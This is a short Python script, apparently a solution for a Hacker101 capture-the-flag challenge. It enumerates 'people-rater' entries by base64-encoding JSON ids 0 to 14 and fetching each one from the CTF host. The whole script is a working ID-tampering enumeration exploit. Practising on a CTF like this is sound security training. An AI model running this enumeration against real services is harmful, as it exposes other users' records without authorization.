#!/usr/bin/python3
from base64 import b64encode

from requests import get

# payload = '{"id":3}'

url = "https://0daca7d6c9e9a144d5ede3830be61897.ctf.hacker101.com"


for i in range(15):
	payload = '{"id":%s}' % i
	payload = b64encode(payload.encode()).decode()
	#print(payload)
	r = get(url + f"/people-rater/entry/?id={payload}")
	print(r.text)